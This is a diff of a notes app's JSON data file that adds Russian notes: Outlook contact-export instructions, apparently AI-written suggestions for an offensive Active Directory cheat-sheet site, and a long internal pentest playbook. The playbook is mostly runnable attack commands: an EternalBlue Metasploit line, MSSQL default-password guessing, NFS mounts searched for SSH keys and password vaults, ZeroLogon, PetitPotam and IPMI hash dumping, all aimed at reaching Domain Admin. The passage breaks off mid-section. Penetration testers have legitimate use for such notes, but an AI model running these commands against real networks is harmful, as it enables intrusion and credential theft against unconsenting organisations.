@@ -100,12 +100,12 @@
     },
     {
       "workspaceId": "ws_1llp",
-      "name": "Playbooks",
-      "icon": "📖",
-      "color": "#00BCD4",
+      "name": "New playbooks",
+      "icon": "📁",
+      "color": "#6366f1",
       "baseType": "playbooks",
-      "isDefault": true,
-      "id": "cat_playbooks_job",
+      "isDefault": false,
+      "id": "matqgz41wmpihobae",
       "order": 6
     }
   ],
@@ -192,13 +192,22 @@
       "createdAt": "2026-03-05T17:42:39.945Z"
     },
     {
-      "id": "f_playbooks",
-      "categoryId": "cat_playbooks_job",
+      "name": "Внутрянка",
+      "categoryId": "cat_y74gxb",
       "parentId": null,
-      "name": "Services",
-      "order": 0,
       "isExpanded": true,
-      "createdAt": "2026-05-13T00:00:00.000Z"
+      "id": "4qpd3cjewmn1qgdjc",
+      "order": 2,
+      "createdAt": "2026-03-22T12:28:24.072Z"
+    },
+    {
+      "name": "win",
+      "categoryId": "matqgz41wmpihobae",
+      "parentId": null,
+      "isExpanded": true,
+      "id": "32tclf0rimpihof02",
+      "order": 1,
+      "createdAt": "2026-05-23T15:14:12.338Z"
     }
   ],
   "notes": [
@@ -235,7 +244,7 @@
       "isFavorite": false,
       "order": "1",
       "createdAt": "2026-03-03T13:54:47.675Z",
-      "updatedAt": "2026-03-04T13:15:45.136Z",
+      "updatedAt": "2026-03-23T08:56:12.402Z",
       "type": "notes"
     },
     {
@@ -254,6 +263,66 @@
       "type": "notes"
     },
     {
+      "id": "olt9c1vvimmiz8j3c",
+      "folderId": "f_u6y9ox",
+      "title": "Экспорт из Outlook",
+      "content": "# Запрос как можно выгрузить с outlook  адресную книгу в какой то формат  txt, cvs  и т.д. у меня много записей как то это возможно получить чтобы не руками перебивать?\n    \n\n\nЭкспорт адресной книги из Outlook\nСпособ 1: Встроенный экспорт в CSV (самый простой)\nOutlook (классический, desktop)\n\n    Файл → Открыть и экспортировать → Импорт и экспорт\n    Выберите «Экспорт в файл» → Далее\n    Выберите «Значения, разделённые запятыми» (CSV) → Далее\n    Выберите папку «Контакты» (Contacts) → Далее\n    Укажите путь и имя файла → Готово\n\n    Получите .csv файл, который открывается в Excel, Google Sheets, любом текстовом редакторе.\n\nСпособ 2: Outlook в вебе (OWA / Microsoft 365)\n\n    Зайдите на outlook.live.com или outlook.office.com\n    Нажмите значок «Люди» (People) внизу слева\n    Справа вверху: «Управление контактами» → «Экспорт контактов»\n    Выберите все контакты или нужную папку\n    Нажмите «Экспорт» → скачается .csv\n\nСпособ 3: Через PowerShell (если Exchange / Microsoft 365)\n\nPowerShell\n\n# Подключение к Exchange Online\nConnect-ExchangeOnline\n\n# Экспорт GAL (глобальной адресной книги)\nGet-GlobalAddressList | Get-Recipient | Select-Object DisplayName, PrimarySmtpAddress | Export-Csv -Path \"C:\\contacts.csv\" -NoTypeInformation -Encoding UTF8\n\n# Или все почтовые ящики\nGet-Mailbox -ResultSize Unlimited | Select-Object DisplayName, PrimarySmtpAddress, Department, Title | Export-Csv -Path \"C:\\mailboxes.csv\" -NoTypeInformation -Encoding UTF8\n\nСпособ 4: Через VBA макрос (если нужны все поля)\n\nВ Outlook нажмите Alt+F11, вставьте модуль:\n\nvba\n\nSub ExportContacts()\n    Dim olFolder As Outlook.MAPIFolder\n    Dim olItem As Object\n    Dim filePath As String\n    Dim fileNum As Integer\n    \n    Set olFolder = Application.GetNamespace(\"MAPI\").GetDefaultFolder(olFolderContacts)\n    \n    filePath = \"C:\\contacts_export.csv\"\n    fileNum = FreeFile\n    \n    Open filePath For Output As #fileNum\n    \n    ' Заголовки\n    Print #fileNum, \"Имя;Фамилия;Email;Телефон;Компания;Должность\"\n    \n    For Each olItem In olFolder.Items\n        If TypeOf olItem Is Outlook.ContactItem Then\n            Dim c As Outlook.ContactItem\n            Set c = olItem\n            Print #fileNum, c.FirstName & \";\" & c.LastName & \";\" & _\n                           c.Email1Address & \";\" & c.BusinessTelephoneNumber & \";\" & _\n                           c.CompanyName & \";\" & c.JobTitle\n        End If\n    Next\n    \n    Close #fileNum\n    MsgBox \"Экспортировано в \" & filePath\nEnd Sub\n\nСпособ 5: Экспорт в vCard (.vcf)\n\n    Откройте Контакты в Outlook\n    Выделите все: Ctrl+A\n    Файл → Сохранить как → формат vCard (.vcf)\n\n    ⚠️ Может создать отдельный файл на каждый контакт.\n\nКакой способ выбрать?\nСитуация\tРекомендация\nЛичные контакты, < 1000\tСпособ 1 (CSV через меню)\nMicrosoft 365 в браузере\tСпособ 2 (OWA)\nКорпоративная GAL (глобальная книга)\tСпособ 3 (PowerShell)\nНужна гибкость по полям\tСпособ 4 (VBA)\nВажно про корпоративную GAL\n\nЕсли вам нужна именно глобальная адресная книга компании (а не личные контакты), то:\n\n    Через интерфейс Outlook она напрямую не экспортируется\n    Нужно либо PowerShell (способ 3), либо попросить администратора Exchange\n    Обходной путь: скопировать контакты из GAL в личную папку контактов, затем экспортировать\n\nКакой у вас Outlook — десктопный, веб, какая версия? Уточню инструкцию под вашу ситуацию.\n\n\n---\n\nЭкспорт корпоративной GAL через PowerShell\n1. Подготовка — установка модуля\n\nОткройте PowerShell от имени администратора:\n\nPowerShell\n\n# Установка модуля Exchange Online (один раз)\nInstall-Module -Name ExchangeOnlineManagement -Force -Scope CurrentUser\n\n# Если уже установлен — обновите\nUpdate-Module -Name ExchangeOnlineManagement\n\n2. Подключение\nВариант А: Microsoft 365 / Exchange Online\n\nPowerShell\n\n# Подключение (откроется окно логина)\nImport-Module ExchangeOnlineManagement\nConnect-ExchangeOnline -UserPrincipalName ваш_email@company.com\n\nВариант B: Локальный Exchange Server (on-premises)\n\nPowerShell\n\n# Подключение к локальному Exchange\n$Session = New-PSSession -ConfigurationName Microsoft.Exchange `\n    -ConnectionUri http://ваш-exchange-сервер/PowerShell/ `\n    -Authentication Kerberos\nImport-PSSession $Session\n\n3. Экспорт — основные команды\n3.1 Все почтовые ящики (самый частый случай)\n\nPowerShell\n\nGet-Mailbox -ResultSize Unlimited | \n    Select-Object DisplayName, PrimarySmtpAddress, Department, Title, Office, Phone | \n    Export-Csv -Path \"C:\\GAL_Export.csv\" -NoTypeInformation -Encoding UTF8 -Delimiter \";\"\n\n3.2 Все получатели (ящики + группы + контакты + ресурсы)\n\nPowerShell\n\nGet-Recipient -ResultSize Unlimited | \n    Select-Object DisplayName, PrimarySmtpAddress, RecipientType, Department, Company | \n    Export-Csv -Path \"C:\\GAL_All_Recipients.csv\" -NoTypeInformation -Encoding UTF8 -Delimiter \";\"\n\n3.3 Максимально подробный экспорт\n\nPowerShell\n\nGet-User -ResultSize Unlimited | \n    Select-Object DisplayName, \n                  UserPrincipalName, \n                  FirstName, \n                  LastName, \n                  Title,               # Должность\n                  Department,          # Отдел\n                  Company,             # Компания\n                  Office,              # Офис\n                  City,                # Город\n                  StateOrProvince,     # Область\n                  CountryOrRegion,     # Страна\n                  Phone,               # Телефон\n                  MobilePhone,         # Мобильный\n                  Fax,                 # Факс\n                  StreetAddress,       # Адрес\n                  PostalCode,          # Индекс\n                  Manager,             # Руководитель\n                  WindowsEmailAddress  # Email\n    | Export-Csv -Path \"C:\\GAL_Detailed.csv\" -NoTypeInformation -Encoding UTF8 -Delimiter \";\"\n\n3.4 Только определённый отдел\n\nPowerShell\n\nGet-User -ResultSize Unlimited -Filter \"Department -eq 'IT'\" | \n    Select-Object DisplayName, UserPrincipalName, Title, Phone | \n    Export-Csv -Path \"C:\\GAL_IT_Department.csv\" -NoTypeInformation -Encoding UTF8 -Delimiter \";\"\n\n3.5 Группы рассылки\n\nPowerShell\n\n# Список всех групп\nGet-DistributionGroup -ResultSize Unlimited | \n    Select-Object DisplayName, PrimarySmtpAddress, ManagedBy | \n    Export-Csv -Path \"C:\\GAL_Groups.csv\" -NoTypeInformation -Encoding UTF8 -Delimiter \";\"\n\n# Участники конкретной группы\nGet-DistributionGroupMember -Identity \"Название группы\" | \n    Select-Object DisplayName, PrimarySmtpAddress | \n    Export-Csv -Path \"C:\\Group_Members.csv\" -NoTypeInformation -Encoding UTF8 -Delimiter \";\"\n\n4. Экспорт в другие форматы\nВ TXT (табуляция)\n\nPowerShell\n\nGet-Mailbox -ResultSize Unlimited | \n    Select-Object DisplayName, PrimarySmtpAddress, Department | \n    Export-Csv -Path \"C:\\GAL.txt\" -NoTypeInformation -Encoding UTF8 -Delimiter \"`t\"\n\nВ простой текст (построчно)\n\nPowerShell\n\nGet-Mailbox -ResultSize Unlimited | \n    ForEach-Object { \"$($_.DisplayName) — $($_.PrimarySmtpAddress)\" } | \n    Out-File -FilePath \"C:\\GAL_simple.txt\" -Encoding UTF8\n\nВ Excel напрямую (если установлен модуль ImportExcel)\n\nPowerShell\n\nInstall-Module ImportExcel -Force -Scope CurrentUser\n\nGet-User -ResultSize Unlimited | \n    Select-Object DisplayName, UserPrincipalName, Department, Title, Phone | \n    Export-Excel -Path \"C:\\GAL.xlsx\" -AutoSize -TableName \"GAL\" -WorksheetName \"Контакты\"\n\n5. После завершения — отключение\n\nPowerShell\n\nDisconnect-ExchangeOnline -Confirm:$false\n\n6. Возможные проблемы и решения\nПроблема\tРешение\nНет прав на выполнение команд\tНужна роль Global Reader, Exchange Admin или хотя бы View-Only Recipients — обратитесь к IT-администратору\nОшибка при установке модуля\tЗапустите Set-ExecutionPolicy RemoteSigned -Scope CurrentUser\nМного записей, команда зависает\tДобавьте -ResultSize 500 для теста, потом уберите лимит\nКракозябры в CSV\tОткройте в Excel через Данные → Из текста и выберите кодировку UTF-8\nНет доступа к PowerShell\tПопросите администратора выгрузить или используйте обходной путь (ниже)\n7. Обходной путь (без PowerShell, без прав админа)\n\nЕсли нет прав на PowerShell, можно через Outlook:\n\ntext\n\n1. Outlook → Адресная книга (Ctrl+Shift+B)\n2. Найдите нужные контакты в GAL\n3. Выделите все (Ctrl+A)\n4. Правой кнопкой → «Добавить в контакты» (Add to Contacts)\n5. Контакты скопируются в вашу личную папку\n6. Файл → Импорт/Экспорт → Экспорт в CSV\n\n    ⚠️ Этот способ работает, но при большом количестве (тысячи) может быть медленным.\n\nБыстрый старт — скопируй и запусти:\n\nPowerShell\n\n# === ПОЛНЫЙ СКРИПТ ДЛЯ КОПИРОВАНИЯ ===\nInstall-Module -Name ExchangeOnlineManagement -Force -Scope CurrentUser\nImport-Module ExchangeOnlineManagement\nConnect-ExchangeOnline\n\n$path = \"$env:USERPROFILE\\Desktop\\GAL_Export.csv\"\n\nGet-User -ResultSize Unlimited | \n    Select-Object DisplayName, WindowsEmailAddress, FirstName, LastName, \n                  Title, Department, Company, Office, Phone, MobilePhone, City | \n    Export-Csv -Path $path -NoTypeInformation -Encoding UTF8 -Delimiter \";\"\n\nDisconnect-ExchangeOnline -Confirm:$false\n\nWrite-Host \"Файл сохранён на рабочий стол: $path\" -ForegroundColor Green\n\nФайл появится на рабочем столе. Если что-то не сработает — напишите текст ошибки, помогу разобраться.",
+      "tags": [],
+      "isFavorite": false,
+      "order": "2",
+      "createdAt": "2026-03-09T09:26:37.224Z",
+      "updatedAt": "2026-03-09T19:33:31.973Z",
+      "type": "notes"
+    },
+    {
+      "id": "ckt9i8qscmmhz8sz6",
+      "folderId": "f_u6y9ox",
+      "title": "улучшения для раздела с линками",
+      "content": "Был запрос: можешь посмотреть что на сайте https://wadcoms.github.io/# и какие улучшения можешь предложить?\n\nАнализ WADComs.github.io и предложения по улучшению\n\n    Примечание: Я не могу в реальном времени загружать веб-страницы, но я хорошо знаком с проектом WADComs (Windows/Active Directory Commands) — это интерактивный cheat sheet для наступательной безопасности в средах Windows/AD, по аналогии с GTFOBins/LOLBAS.\n\n📌 Что представляет собой сайт\n\nWADComs — это курируемая коллекция команд для инструментов пентеста Windows/AD, с фильтрацией по:\n\n    Инструменту (Impacket, CrackMapExec, PowerView, BloodHound, Rubeus, Mimikatz и т.д.)\n    Типу действия (Enumeration, Exploitation, Lateral Movement, Credential Harvesting…)\n    Типу доступа (Password, Hash, Ticket, No Credentials…)\n    Целевой среде (AD, Local…)\n\n🔧 Предложения по улучшению\n1. Контент и покрытие\nОбласть\tПредложение\nНовые инструменты\tДобавить: Certipy (AD CS атаки), Coercer (принуждение аутентификации), KrbRelayUp, nxc (NetExec — форк CrackMapExec), Whisker, PassTheCert, PKINITtools, bloodyAD, ldapdomaindump, ADCSKiller\nAD CS атаки\tЦелый раздел по ESC1-ESC13 уязвимостям Active Directory Certificate Services — сейчас это один из главных векторов\nLinux-таргеты в AD\tАтаки на Linux-машины, присоединённые к AD (SSSD, keytab abuse, и т.д.)\nAzure AD / Entra ID\tГибридные среды: AADInternals, ROADtools, TokenTacticsV2, GraphRunner\nSCCM/MECM атаки\tSharpSCCM, MalSCCM, sccmhunter\nMSSQL\tАтаки через MSSQL linked servers (PowerUpSQL)\n2. UX/UI улучшения\n\ntext\n\n🔍 Поиск и навигация:\n├── Полнотекстовый поиск (сейчас только фильтры по тегам)\n├── Поиск по описанию команды / ключевым словам\n├── URL-якоря для каждой команды (для шаринга конкретной команды)\n├── \"Похожие команды\" — связи между альтернативными способами\n└── Сортировка по популярности/дате добавления\n\n📋 Удобство использования:\n├── Кнопка \"Copy to clipboard\" для каждой команды\n├── Тёмная тема / переключатель тем\n├── Подсветка синтаксиса в блоках кода\n├── Мобильная адаптивность (если её нет или она слабая)\n└── Offline-режим (PWA / Service Worker)\n\n3. Структурные улучшения\n\ntext\n\n📂 Категоризация по kill chain:\n├── Reconnaissance\n├── Initial Access\n├── Credential Access\n├── Privilege Escalation\n├── Lateral Movement\n├── Persistence\n├── Defense Evasion\n├── Exfiltration\n└── Impact\n\nЭто можно маппить на MITRE ATT&CK TTP\n\nКонкретно:\n\n    Маппинг на MITRE ATT&CK — каждой команде присвоить TTP ID (например, T1558.003 для Kerberoasting). Это огромная добавленная ценность для red team отчётов.\n    Уровни привилегий — явно указать: какие привилегии нужны ДО выполнения, и что получаем ПОСЛЕ.\n    Prerequisite chain — \"Чтобы выполнить X, сначала нужно Y\".\n\n4. Образовательный компонент\n\nMarkdown\n\nДля каждой команды добавить:\n┌─────────────────────────────────────┐\n│ 📝 Описание: что делает команда     │\n│ ⚙️ Как работает: механизм атаки     │\n│ 🛡️ Детекция: что увидит Blue Team  │\n│ 📊 Event IDs: какие логи генерит    │\n│ 🔒 Митигация: как защититься       │\n│ 📎 Ссылки: статьи, блоги, CVE      │\n└─────────────────────────────────────┘\n\nЭто превратит инструмент из простого cheat sheet в полноценную образовательную платформу для Red + Blue + Purple team.\n5. Технические улучшения\n\nYAML\n\nAPI:\n  - REST API для программного доступа к базе команд\n  - JSON/YAML экспорт всей базы\n  - Интеграция с CLI-утилитами\n\nContribution:\n  - Упрощённый шаблон для PR (сейчас нужно разбираться в Jekyll)\n  - Веб-форма для предложения новых команд\n  - Система голосования за приоритет добавления\n\nВерсионирование:\n  - Changelog / \"What's new\"\n  - RSS/Atom feed для новых команд\n  - Версии инструментов, для которых команда актуальна\n\n6. Интерактивные фичи\n\ntext\n\n🧪 Playground / Lab integration:\n├── Ссылки на TryHackMe/HackTheBox лабы, где можно попрактиковать\n├── Примеры вывода команд (expected output)\n├── Скриншоты / GIF-демонстрации\n└── Docker-окружения для локального тестирования\n\n🔗 Связь с другими проектами:\n├── GTFOBins (Linux privilege escalation)\n├── LOLBAS (Living Off the Land Binaries)\n├── LOLDrivers\n├── HijackLibs\n└── MalAPI.io\n\n7. Приоритетные дополнения по контенту (2024-2025)\n\ntext\n\n🔥 Горячие темы, которых может не хватать:\n├── Shadow Credentials (Whisker + PyWhisker)\n├── RBCD (Resource-Based Constrained Delegation) abuse\n├── AD CS (Certipy, Certify, ForgeCert)\n├── NTLM relay (ntlmrelayx с различными атаками)\n├── Coercion methods (PetitPotam, PrinterBug, DFSCoerce, ShadowCoerce)\n├── Diamond/Sapphire Ticket attacks\n├── Golden/Silver certificate attacks\n├── LAPS password reading (новый Windows LAPS)\n├── gMSA password dumping\n├── DACL/ACL abuse workflows\n├── Cross-forest и cross-domain атаки\n├── ADIDNS poisoning\n└── MachineAccountQuota abuse\n\n🏆 Резюме: ТОП-5 самых импактных улучшений\n#\tУлучшение\tПочему важно\n1\tMITRE ATT&CK маппинг\tСтандартизация, полезность для отчётов\n2\tAD CS раздел\tСамый актуальный вектор атак 2023-2025\n3\tДетекция + Event IDs\tПревращает в Purple Team инструмент\n4\tПолнотекстовый поиск\tКритично для UX при растущей базе\n5\tNetExec + новые инструменты\tCrackMapExec deprecated, нужна актуализация\n\nХотите, чтобы я детализировал какой-то из пунктов или помог с реализацией конкретного улучшения (например, написал YAML-шаблон для новых команд или маппинг на MITRE)?",
+      "tags": [],
+      "isFavorite": false,
+      "order": "1",
+      "createdAt": "2026-03-08T16:39:03.858Z",
+      "updatedAt": "2026-03-23T08:56:06.609Z",
+      "type": "notes"
+    },
+    {
+      "id": "ohwav5y0nmn5puoqh",
+      "folderId": "4qpd3cjewmn1qgdjc",
+      "title": "after_nmap_top100",
+      "content": "INTERNAL PENTEST PLAYBOOK: POST-NMAP ANALYSIS → DA\nPHASE 1: АНАЛИЗ NMAP РЕЗУЛЬТАТОВ (первые 5 минут)\n1.1. Быстрый парсинг — выделяем главное\nBash\n\n# Сохраняем переменные для удобства\nNMAP_FILE=\"new_project_top100\"\n\n# Все живые хосты с открытыми портами\ngrep \"open\" ${NMAP_FILE}.gnmap | awk '{print $2}' | sort -u > nmap_alive.txt\n\n# Быстрая сводка: какие порты на каких хостах\ngrep -oP '\\d+/open/tcp//[^/]+' ${NMAP_FILE}.gnmap | sort | uniq -c | sort -rn | head -30\n# → покажет самые распространённые сервисы в сети\n\n# OS detection summary\ngrep \"OS:\" ${NMAP_FILE}.gnmap | sort -u\n\n# Все сервисы с версиями (для поиска уязвимых)\ngrep -E \"open\" ${NMAP_FILE}.nmap | grep -v \"filtered\" | sort -u > all_services.txt\n1.2. На что смотреть В ПЕРВУЮ ОЧЕРЕДЬ (порядок приоритета)\ntext\n\nПРИОРИТЕТ 1 — INSTANT WIN (смотрим первым делом):\n─────────────────────────────────────────────────\n[!] Старые ОС: Windows 2008, 2003, XP, 7 → MS17-010 / EternalBlue\n[!] MSSQL (1433) с sa:sa или sa:'' \n[!] FTP anonymous (21)\n[!] NFS shares (111/2049) — монтируем без кредов\n[!] Telnet (23) — legacy, часто без пароля или admin:admin\n[!] IPMI (623/udp) — cipher zero, hash dump\n[!] Принтеры / iLO / iDRAC — дефолтные креды\n[!] Jenkins / Tomcat / JBoss без аутентификации\n[!] SMB signing disabled + LLMNR/NBNS → relay\n\nПРИОРИТЕТ 2 — QUICK WINS С МИНИМАЛЬНЫМИ УСИЛИЯМИ:\n──────────────────────────────────────────────────\n[*] Kerberos (88) → DC identified → AS-REP roast\n[*] LDAP (389/636) anonymous bind\n[*] SMB null/guest sessions → enum users, shares\n[*] RDP (3389) → NLA disabled? bluekeep?\n[*] WinRM (5985/5986) → проверяем после получения кредов\n[*] Web services → default creds, known CVE\n\nПРИОРИТЕТ 3 — ТРЕБУЮТ КРЕДОВ ИЛИ ВРЕМЕНИ:\n───────────────────────────────────────────\n[·] Kerberoasting (нужны креды)\n[·] BloodHound (нужны креды)\n[·] ADCS (нужны креды)\n[·] Password spray (нужен список юзеров)\n[·] Lateral movement\n1.3. Быстрый парсинг по категориям\nBash\n\n# === DC / AD Infrastructure ===\ngrep -E \"88/open|389/open|636/open|53/open\" ${NMAP_FILE}.gnmap | awk '{print $2}' | sort -u > confirmed_dcs.txt\necho \"[*] Domain Controllers:\"\ncat confirmed_dcs.txt\n\n# === Windows hosts (по портам и OS detection) ===\ngrep -iE \"windows|microsoft\" ${NMAP_FILE}.nmap | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | sort -u > windows_hosts.txt\n\n# === Legacy / Vulnerable OS ===\ngrep -iE \"windows.*(2003|2008|xp|vista|7 )\" ${NMAP_FILE}.nmap | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | sort -u > legacy_windows.txt\necho \"[!!!] Legacy Windows (likely vulnerable):\"\ncat legacy_windows.txt\n\n# === Linux hosts ===\ngrep -iE \"linux|ubuntu|centos|debian\" ${NMAP_FILE}.nmap | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+' | sort -u > linux_hosts.txt\n\n# === Хосты с максимальным количеством открытых портов (самые \"жирные\") ===\ngrep \"open\" ${NMAP_FILE}.gnmap | awk '{print $2, gsub(/open/,\"\")}' | sort -t' ' -k2 -rn | head -20 > fattest_hosts.txt\necho \"[*] Most exposed hosts:\"\ncat fattest_hosts.txt\n\n# === Нестандартные порты (часто самое интересное) ===\ngrep -oP '\\d+/open' ${NMAP_FILE}.gnmap | cut -d/ -f1 | sort -un | while read port; do\n    count=$(grep -c \"$port/open\" ${NMAP_FILE}.gnmap)\n    if [ \"$count\" -le 3 ] && [ \"$port\" -gt 1024 ]; then\n        echo \"[RARE] Port $port open on $count hosts\"\n    fi\ndone | tee rare_ports.txt\n1.4. Паттерны которые ищем глазами в nmap output\nBash\n\n# Пароли / креды в баннерах\ngrep -iE \"password|credential|anonymous|default|unauthorized\" ${NMAP_FILE}.nmap\n\n# Конкретные продукты с известными CVE\ngrep -iE \"apache 2\\.[24]\\.|iis [67]\\.|tomcat [5-8]\\.|weblogic|jboss|jenkins|gitlab|exchange|sharepoint|citrix|pulse|fortinet|f5|vcenter|esxi|solarwinds|zabbix|nagios|grafana|kibana|elastic|splunk|confluence|jira|bitbucket|nexus|sonarqube|artifactory\" ${NMAP_FILE}.nmap | tee known_products.txt\n\n# SMB версии (для подбора эксплойтов)\ngrep -iE \"smb|microsoft-ds|netbios\" ${NMAP_FILE}.nmap\n\n# SSL/TLS info (для определения продуктов)\ngrep -iE \"ssl-cert|commonName|organizationName\" ${NMAP_FILE}.nmap | sort -u\n\n# Hostname leak через сертификаты и NetBIOS\ngrep -iE \"commonName=|NetBIOS|DNS:\" ${NMAP_FILE}.nmap | sort -u > hostnames.txt\nPHASE 2: ДЕЙСТВИЯ СРАЗУ ПОСЛЕ NMAP (следующие 15-30 минут)\n2.1. Дерево принятия решений\ntext\n\nnmap результаты получены\n│\n├─► Legacy Windows найден? (2003/2008/XP/7)\n│   └─► ДА → НЕМЕДЛЕННО проверяй MS17-010 → shell → SAM → lateral\n│\n├─► SMB signing disabled на хостах?\n│   └─► ДА → Responder уже ловит → ntlmrelayx уже крутится → жди auth\n│\n├─► Null session / Guest на SMB?\n│   └─► ДА → enum users → AS-REP roast → password spray\n│\n├─► LDAP anonymous bind?\n│   └─► ДА → dump всех юзеров → ищи пароли в description → AS-REP → spray\n│\n├─► Web-сервисы нашлись?\n│   └─► ДА → скриншоты → ищи Jenkins/Tomcat/известные продукты → default creds\n│\n├─► MSSQL найден?\n│   └─► ДА → sa:sa, sa:'', sa:Password1 → xp_cmdshell → shell\n│\n├─► FTP anonymous?\n│   └─► ДА → смотри содержимое → конфиги, скрипты с паролями\n│\n├─► NFS (111/2049)?\n│   └─► ДА → showmount → mount → ищи SSH keys, конфиги, .bash_history\n│\n└─► Ничего из вышеперечисленного?\n    └─► Упор на Responder/mitm6 relay + kerbrute enum + spray\n2.2. Приоритизированные атаки (запускаем параллельно)\nВолна 1 — Первые 5 минут после nmap (параллельно):\n\nBash\n\n# 1. Legacy Windows — EternalBlue\nif [ -s legacy_windows.txt ]; then\n    echo \"[!!!] LEGACY WINDOWS FOUND — checking MS17-010\"\n    netexec smb legacy_windows.txt -M ms17-010 2>&1 | tee ms17010_results.txt\n    grep -i \"VULNERABLE\" ms17010_results.txt\n    # Если vulnerable:\n    # msfconsole -q -x \"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS $(cat legacy_windows.txt | head -1); set LHOST YOUR_IP; run\"\nfi\n\n# 2. NFS shares (часто забывают, а там бывает /home, /etc, backup)\nif [ -s nfs_hosts.txt ] || grep -q \"111/open\\|2049/open\" ${NMAP_FILE}.gnmap; then\n    grep -E \"111/open|2049/open\" ${NMAP_FILE}.gnmap | awk '{print $2}' | sort -u > nfs_hosts.txt\n    for ip in $(cat nfs_hosts.txt); do\n        echo \"=== NFS on $ip ===\"\n        showmount -e $ip 2>&1\n    done | tee nfs_exports.txt\n    # Если нашли экспорт:\n    # mkdir -p /tmp/nfs_mount\n    # mount -t nfs $ip:/export /tmp/nfs_mount -o nolock\n    # find /tmp/nfs_mount -name \"*.conf\" -o -name \"*.config\" -o -name \"*.xml\" -o -name \"*.ini\" \\\n    #   -o -name \"*.sh\" -o -name \"*.ps1\" -o -name \"*.bat\" -o -name \"id_rsa\" -o -name \"*.kdbx\" \\\n    #   -o -name \".bash_history\" -o -name \"*.pgpass\" -o -name \"*.my.cnf\" 2>/dev/null\nfi\n\n# 3. MSSQL quick check\nif [ -s db_hosts.txt ]; then\n    echo \"[*] Checking MSSQL default creds\"\n    netexec mssql db_hosts.txt -u sa -p '' 2>&1 | tee mssql_blank.txt\n    netexec mssql db_hosts.txt -u sa -p 'sa' 2>&1 | tee -a mssql_blank.txt\n    netexec mssql db_hosts.txt -u sa -p 'Password1' 2>&1 | tee -a mssql_blank.txt\n    netexec mssql db_hosts.txt -u sa -p 'P@ssw0rd' 2>&1 | tee -a mssql_blank.txt\n    netexec mssql db_hosts.txt -u sa -p 'sa123' 2>&1 | tee -a mssql_blank.txt\n    grep \"+\" mssql_blank.txt\nfi\n\n# 4. FTP anonymous\nif [ -s ftp_hosts.txt ]; then\n    for ip in $(cat ftp_hosts.txt); do\n        echo \"=== FTP $ip ===\"\n        timeout 10 ftp -n $ip <<EOF 2>&1\nuser anonymous anonymous@\nls -la\nbye\nEOF\n    done | tee ftp_anon_results.txt\nfi\n\n# 5. Telnet — дефолтные / пустые креды\ngrep \"23/open\" ${NMAP_FILE}.gnmap | awk '{print $2}' | sort -u > telnet_hosts.txt\nif [ -s telnet_hosts.txt ]; then\n    for ip in $(cat telnet_hosts.txt); do\n        echo \"=== Telnet $ip ===\"\n        timeout 5 bash -c \"echo '' | telnet $ip 2>&1\" | head -10\n    done | tee telnet_banners.txt\nfi\nВолна 2 — Следующие 10 минут:\n\nBash\n\n# 6. ZeroLogon (если ещё не проверяли)\nfor dc in $(cat confirmed_dcs.txt); do\n    netexec smb $dc -M zerologon 2>&1\ndone | tee zerologon_results.txt\n\n# 7. PetitPotam без кредов\nfor dc in $(cat confirmed_dcs.txt); do\n    netexec smb $dc -M petitpotam 2>&1\ndone | tee petitpotam_results.txt\n\n# 8. Coerce attacks\nnetexec smb smb_hosts.txt -M coerce_plus 2>&1 | tee coerce_results.txt\n\n# 9. WebDAV (для relay через HTTP)\nnetexec smb smb_hosts.txt -M webdav 2>&1 | tee webdav_results.txt\n\n# 10. IPMI\nmasscan -iL scope.txt -pU:623 --rate 3000 -oL ipmi_scan.txt 2>/dev/null\ngrep \"^open\" ipmi_scan.txt | awk '{print $4}' > ipmi_hosts.txt\nif [ -s ipmi_hosts.txt ]; then\n    for ip in $(cat ipmi_hosts.txt); do\n        echo \"=== IPMI $ip ===\"\n        # Cipher zero vulnerability\n        ipmitool -I lanplus -H $ip -U admin -P admin -C 0 user list 2>&1\n        # RAKP hash retrieval (MSF)\n        # use auxiliary/scanner/ipmi/ipmi_dumphashes\n    done | tee ipmi_results.txt\nfi\n2.3. Связка masscan + nmap + AD разведка\nBash\n\n# Сверяем данные: masscan мог пропустить (UDP, rate too high)\n# nmap мог не покрыть (top-100 не включает все порты)\n\n# Хосты, которые masscan нашёл, а nmap нет\ncomm -23 <(sort live_hosts.txt) <(sort nmap_alive.txt) > missed_by_nmap.txt\nif [ -s missed_by_nmap.txt ]; then\n    echo \"[!] Hosts found by masscan but missed by nmap:\"\n    cat missed_by_nmap.txt\n    # Досканиваем их\n    nmap -iL missed_by_nmap.txt --top-ports 100 -sV -Pn -T4 -oA missed_hosts_scan\nfi\n\n# Объединяем всё в master inventory\necho \"=== NETWORK INVENTORY ===\" > inventory.txt\necho \"\" >> inventory.txt\necho \"Domain: $DOMAIN\" >> inventory.txt\necho \"DC IPs: $(cat confirmed_dcs.txt | tr '\\n' ', ')\" >> inventory.txt\necho \"Total alive hosts: $(cat live_hosts.txt | wc -l)\" >> inventory.txt\necho \"SMB hosts: $(cat smb_hosts.txt | wc -l)\" >> inventory.txt\necho \"Web hosts: $(cat web_hosts.txt | wc -l)\" >> inventory.txt\necho \"DB hosts: $(cat db_hosts.txt | wc -l)\" >> inventory.txt\necho \"Legacy Windows: $(cat legacy_windows.txt 2>/dev/null | wc -l)\" >> inventory.txt\necho \"Relay targets (no SMB signing): $(cat relay_targets.txt 2>/dev/null | wc -l)\" >> inventory.txt\ncat inventory.txt\nPHASE 3: РАЗБИВКА ПО СЕРВИСАМ — ДЕТАЛЬНЫЙ PLAYBOOK\n3.1. SMB / AD / LDAP / KERBEROS\ntext\n\nЦЕЛЬ: получить список юзеров → AS-REP → spray → Kerberoast → DA\nЭто основной вектор в 80% внутренних пентестов.\nШаг A: Определяем AD-инфраструктуру\nBash\n\n# Все DC (порт 88 = Kerberos = гарантированно DC)\nDC_IP=$(head -1 confirmed_dcs.txt)\n\n# Получаем точное имя домена\nnetexec smb $DC_IP 2>&1 | tee dc_info.txt\n# Вывод: SMB  10.10.10.1  445  DC01  [*] Windows Server 2019 ... (name:DC01) (domain:corp.local) (signing:True) (SMBv1:False)\n\nDOMAIN=$(grep \"domain:\" dc_info.txt | grep -oP 'domain:\\K[^)]+')\nDC_HOSTNAME=$(grep \"name:\" dc_info.txt | grep -oP 'name:\\K[^)]+')\n\n# Все DC в домене\nnetexec smb confirmed_dcs.txt 2>&1 | tee all_dcs_info.txt\n\n# DNS zone transfer (иногда работает)\ndig @$DC_IP $DOMAIN axfr 2>&1 | tee dns_zone_transfer.txt\n# Если работает — золотая жила: все hostnames, все 